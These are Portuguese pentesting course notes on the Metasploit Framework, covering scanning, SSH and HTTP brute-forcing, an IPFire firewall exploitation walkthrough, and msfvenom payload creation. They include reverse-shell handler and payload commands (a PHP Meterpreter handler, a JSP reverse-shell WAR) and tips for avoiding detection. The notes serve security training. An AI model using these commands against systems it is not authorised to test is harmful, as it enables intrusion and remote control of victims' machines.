


Antes de iniciarmos esse módulo é importante ressaltar que pré exploração com essa ferramenta se seus métodos de pesquisa **`SEMPRE`** deve ser feita a **análise de vulnerabilidades** explicada no módulo imediatamente anterior.

Sem isso a exploração corre alto risco de ser identificada e ser imprecisa!!!

**`Metasploit Framework`** —> Ferramenta que simplifica o uso de exploits que podem estar em diversas linguagens com diversos payloads diferentes

# Introdução

`apt install metasploit-framework`

**Comandos básicos para iniciar a interface do metasploit:**

- `sudo systemctl start postgresql.service` : Inicia base de dados para integrar infos coletadas no metasploit
- `msfdb`
    - `status` : Status do metasploit
    - `start` : Inicia metasploit
    - `stop` : Para metasploit
    - `init` : Inicia database
- `msfconsole` : Entra na console do metasploit

**Comandos básicos na interface do metasploit**

- `banner`: Mostra outro banner do metasploit
- `show` : Permite fazer pesquisa nos diversos itens do metasploit, como módulos ,paylods, exploit e etc
    - `-h` : Opções possíveis com show
    - `options` : Mostra opções selecionadas para o pacote sendo usado
    - `info` : Apresenta a descrição do item sendo usado
    - `type:<tipo>` : Faz pesquisa por tipo no metasploit
    - `fullname:<item>` : Faz pesquisa por itens que apresentem a string inteira passada em algum lugar
    - `paylods` : Mostra payloads disponíveis pro item
- `use <item>` : Seleciona módulos ,paylods, exploit e etc a ser usado
- `set <item> <conteúdo>` : Edita um valor visto no options do modulo sendo usado para personalizar a utilização do item
    - ex: `set RHOSTS <alvo>` : Seta IP do alvo a ser usado no exploit
    - ex2: `set PAYLOAD <path do payload>` : Seta payload a ser usado no exploit
- `hosts` : Mostra hosts descobertos na rede até agora
- `services` : Comandos que mostra portas abertas para hosts analisados até então
- `vulns` : Mostra vulns identificadas para os hosts vistos até agora
- `jobs` : Mostra processos ativos no sistema
- `sessions` : Mostra sessões abertas no sistema
- `sessions -i <id>` : Acessa sessão
- `run` : Executa o item sendo usado no metasploit
    - `-l` : Roda sessão em segundo plano
- `back` : Volta a página anterior


---



# Módulos auxiliares

Módulos auxiliares são scanners e outros pacotes do metasploit que podem auxiliar a identificar vulnerabilidades no metasploit

Para fazer pesquisar apenas por módulos auxiliares podemos usar

`search type:auxiliary <item>`

Com esses módulos muitas vezes podemos fazer identificações que compõe o comando `vulns` depois, dessa forma fica simples de aplicar exploits confiáveis

Entre os diversos tipos de módulos auxiliares podemos ter desde de scans de rede, a scans de aplicação ou pacotes direcionados a testar uma vulnerabilidade como o Eternalblue.

Outro item que vale a pena citar no metasploit é que ele permite utilizar o NMAP dentro do seu terminal, dessa forma as infos que o NMAP encontrar ficam dentro de sua database também. Para utilizar basta usar o comando `db_nmap`

EX: `db_nmap -v -sSV —top-ports 100 -O -Pn <alvo>`


----



# Ataques de força bruta

A ferramenta metasploit também permite que façamos ataques de força bruta nos alvos a partir de listas de usuários e listas de senha.

Exemplo de processo de ataque força bruta

1. `search type:auxilary ssh` : Retorna os módulos de SSH
2. use /path/bruteforcessh : Utiliza bruteforce SSH
3. `set RHOSTS <ip alvo>` : Seta IP do alvo
4. `set USER_FILE <arquivo>` : Seta arquivo que contém usuários
5. `set PASS_FILE <arquivo>` : Seta arquivo com as senhas
6. `set VERBOSE true` : Seta modo de retorno no console como on
7. `run`
8. `sessions -i <id>` : Acessa sessão criada

Com esse processo ele irá tentar fazer o bruteforce no SSH do alvo com os itens listados


----




# Levantamento de informações

A seguir exemplificarei o processo para levantar informações relevantes que constituirão a base necessária para explorar vulnerabilidades do alvo com exploits.

1. Levantar informações com nmap
    
    `db_nmap -p <portas> —open -sS -Pn <rede>`
    
2. Com as portas encontradas nesse passo uma busca no metasploit procurando encontrar módulos auxiliares para rodar no alvo
    
    `search type:auxiliary <serviço>`
    
3. Utilizar os comandos hosts e vulns procurando observar as alterações que ocorreram na database do metasploit que atualiza automaticamente após o passo 1 e 2
    
4. Utilizar o comando abaixo rodar o módulo auxiliar com o item de IP alvo sendo todos os hosts encontrados com a porta vulnerável
    
    services -p `<porta>` —rhost
    


----



# Explorando vulnerabilidades no Linux (POC)

Após achar as vulnerabilidades e versões encontradas no alvo podemos começar a realizar as explorações com os exploits de acordo com o que vimos anteriormente.

`search type:exploit fullname:<aplicação e versão>` : Comando que faz busca de exploit baseado na aplicação e versão encontrada

Feito isso podemos utilizar o exploit destinado e explorar o alvo

Muito importante é antes de rodar o exploit revisar bem qual o payload sendo utilizado.

`show payloads`

`set PAYLOAD </path/payload>`

**Payloads Meterpreter são capazes de abrir uma bash específica contendo diversos recursos interessantissemos como até envio e recebimento de arquivos, sempre vale a pena usar Meterpreter.

`**type:post` :Tipo de payload usado para pós exploração

DICA: Explorando o alvo você pode rodar um script em do tipo post e definir ele nas infos dele a SESSION em que ele vai rodar, para usar o mesmo bash aberto com o exploit anteriormente.



----




# Tipos de Payload

Legenda de um payload:

```bash
windows/x64/meterpreter/reversetcp

windows e x64 --> Arquitetura e versão do alvo
meterpreter --> tipo do payload
reversetcp --> ação ou atividade do payload
```

*VNCinject —> Tipo de payload que permite conexão VNC com o alvo

### Staged x Inline

Payloads muitas vezes em seu campo de ação/atividade podemos ver ou um ( _ ) ou ( / ),

isso significa que o payload ou é `inline`ou `staged`.

**Inline**

- Payload é enviado todo de uma vez ao host contendo todo o conteúdo do exploit
- - Confiável, + Pesado

**Staged**

- Envia payload de forma fragmentado ao alvo, info por info
- Mais silencioso, menos perceptível

---






# Mindset (Invadindo um firewall)

Nesse módulo começaremos a avaliar um exemplo de como explorar um firewall IPfire visto no curso.

1. Primeiro passo é inicializar o reconhecimento com NMAP, como a porta 80 está aberta realizei um acesso e vi que ele solicita login também (hosts do metasploit será atualizado)
2. Acessando de acordo com a solicitação de credenciais e o erro ao por as credenciais foi identificado que quem faz o bloqueio é um firewall IPfire, o ícone da pasta também auxiliou.
3. Próximo passo é realizar a pesquisa pelo IPfire no metasploit
    1. `search ipfire`
    2. `info`
    3. `set` (opções do ipfire)

ATENÇÃO: O bom pentester sempre tem certeza das versões do exploit e do alvo antes de executar qualquer teste, para não ser identificado.

1. A seguir para ter certeza da versão que achamos no exploit do metasploit, foi feita uma pesquisa na internet por IPfire e achamos todas as pastas de configuração da aplicação. Aprofundando um pouco foi visto que existia um arquivo de créditos, mesmo com as credenciais erradas é possível ver a versão do IPfire
2. Validada a versão você pode rodar o exploit
3. Feito isso também foi necessário rodar um bruteforce via o próprio metasploit para http
    1. `search type:auxiliary http`
4. Confirmando as credenciais achadas com o bruteforce, rode todos os exploits possíveis para o alvo para achar vulns.



---





# Payloads Executáveis

Nessa sessão exploraremos um item importantíssimo que é a criação de payloads executáveis para cada caso em específico partindo dos payloads do metasploit.

msfvenom : Cria payloads executáveis

`-l` : Lista opções possíveis do msfvenom

Ex: `msfvenom -p </path/script/ lhost=<IP do atacante local> lport=<porta atacante local> -f <formato do payload> -o <nomedoarquivo.ext>` ou

`msfvenom -p <payload> LHOST=<IP> LPORT=<PORTA> -f raw > <ARQUIVO.<EXTENÇÃO>`

No exemplo acima poderíamos ter selecionado com script um script de controle remoto e lhost o seu IP da máquina atacante.

Dessa forma criamos um **`arquivo malicioso`**no metasploit.

Para que a conexão possa ocorrer corretamente é necessário que estejamos escutando conexões vindas do alvo em nosso alvo.

Para isso usamos o **`exploit/multi/handler`**

- `use **exploit/multi/handler`**
- `set` (opções do multi handler)
- `run -j` : Roda script em segundo plano, pode ser acessado depois com o `sessions -i <id>`

EX:

```python
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 172.23.10.193
set LPORT 4444
exploit 
```

*** `msfvenom -l payloads | grep <item>` : Pesquisa por payloads pro msfvenom

*Importante deixar anotado que você deve variar o formato do exploit conforme sua necessidade, por exemplo, caso seja notório que o servidor utiliza PHP em suas páginas é inteligente colocar na pasta de PHPs um arquivo .php

EX: `msfvenom -p <path> lhost=<IP> lport=<porta> -f raw -o php.php`

(php precisa ser raw)

EX(.war): `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.23.10.193 LPORT=4545 -f war -o shell.war`




----



# Analisando Exploits

Para finalizar como parte de análise de exploit precisamos entender a fundo o comportando de um exploit antes de utilizarmos.

Sendo assim vale a pena vale a pena fazer a ressalva de que com tempo, sempre deve ser feito o entendimento do funcionamento do payload antes de executa-lo

Para isso podemos usar o wireshark… (Follow TCP string)

Não se esqueça e de ler e entender bem o `info` de um payload antes de usa-lo dá mesma forma. E também, sempre revise as vulnerabilidades e exploits nas `bases de dados` vistas no módulo Análise de vulnerabilidades para ter as melhores práticas do caso.


---






# LABS

![[LABS-Metasploit 1.txt]]


